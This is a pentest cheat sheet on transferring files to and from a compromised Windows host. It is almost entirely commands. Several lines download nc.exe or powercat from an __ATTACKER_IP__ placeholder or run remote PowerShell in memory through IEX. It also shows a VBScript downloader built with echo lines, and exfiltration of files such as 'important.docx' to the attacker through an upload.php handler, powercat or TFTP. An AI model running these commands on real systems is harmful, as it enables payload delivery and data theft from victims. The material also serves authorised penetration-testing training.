# Transferring Files

---

- [Downloading Files](#downloading-files)
- [Uploading Files](#uploading-files)

<a name="downloading-files"></a>
## Downloading Files
### PowerShell
```powershell
(new-object System.Net.WebClient).DownloadFile('http://__ATTACKER_IP__/nc.exe','C:\Windows\Temp\nc.exe')
```

Load the powershell script in memory without downloading.
```powershell
IEX (New-Object System.Net.Webclient).DownloadString('http://__ATTACKER_IP__/powercat.ps1')
```

### Powercat
Listen on the attacking machine.
```sh
sudo nc -lnvp __ATTACKER_PORT__ > proof.txt
```

Send the file from the Windows machine.
```sh
powercat -c __ATTACKER_IP__ -p __ATTACKER_PORT__ -i C:\Users\Administrator\Desktop\proof.txt
```

### exe2hex
Pack the program to be as small as possible.
```sh
upx -9 nc.exe
```

Splits the hex encoded binary into echo commands. At the end a small powershell script to rebuild the file.
```sh
exec2hex -x nc.exe -p nc.cmd
```

### VBScript
Create the `wget.vbs` script.
```sh
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET", strURL, False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs
```

Download a file from attacking machine.
```sh
cscript wget.vbs http://__ATTACKER_IP__/nc.exe nc.exe
```

<a name="uploading-files"></a>
## Uploading Files
### PowerShell
Run an PHP web server (apache/nginx) on attacker machine. Make sure the `/var/www/uploads/` folder exists, or change the path in the following script. Next create the following `upload.php` file in the web root.
```php
<?php
$uploaddir = '/var/www/uploads/';
$uploadfile = $uploaddir . $_FILES['file']['name'];
move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)
?>
```

On the victim machine run the following powershell command.
```powershell
(New-Object System.Net.WebClient).UploadFile('http://__ATTACKER_IP__/upload.php', 'important.docx')
```

### TFTP
Install, setup and configure TFTP on the attacking machine if not already done.
```sh
sudo apt update && sudo apt install atftp
sudo mkdir /tftp
sudo chown nobody: /tftp
sudo atftpd --daemon --port 69 /tftp
```

Run the following command on the victim machine.
> {info} **Note**: Not installed by default on Windows 7 and newer.

```sh
tftp -i __ATTACKER_IP__ put important.docx
```
